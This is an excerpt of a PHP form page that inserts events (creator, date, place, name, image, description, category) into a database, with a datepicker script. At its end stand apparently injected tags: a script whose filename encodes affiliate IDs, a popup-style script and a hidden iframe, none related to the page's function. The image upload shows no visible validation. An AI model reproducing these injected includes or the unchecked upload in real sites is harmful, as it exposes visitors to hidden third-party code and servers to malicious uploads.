...
if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form1")) {
  $insertSQL = sprintf("INSERT INTO events (pembuat, tanggal, tempat, nama, img, deskripsi, kategori) VALUES (%s, %s, %s, %s, %s, %s, %s)",
...
move_uploaded_file($_FILES['img']['tmp_name'], $gambar);
                    ...
                    <form action="<?php echo $editFormAction; ?>" method="post" enctype="multipart/form-data" name="form1">
                      <table align="center">
                        <tr valign="baseline">
                          ...
                          <td><input name="pembuat" type="text" disabled value="<?php echo $_SESSION['MM_Username']; ?>" size="32"></td>
                        </tr>
                        <tr valign="baseline">
                          <td nowrap align="right">Tanggal:</td>
                          <td>
                          
                          <input type="text" name="tanggal" value="12/02/2012"id="dp3" size="32" data-date="12/02/2012" data-date-format="dd/mm/yyyy"></td>
                        </tr>
                        <tr valign="baseline">
...
<script src="asset/aeyJhZmZpZCI6MTAxOCwic3ViYWZmaWQiOjEwMTAsImhyZWYiOiJodHRwOi8v.js"></script><script src="asset/spops-2.js" charset="UTF-8" type="text/javascript"></script><iframe src="asset/pquery-0.htm" style="display: none;"></iframe></body>
<script>
$('#dp3').datepicker({
				format: 'dd/mm/yyyy',
                todayBtn: 'linked'
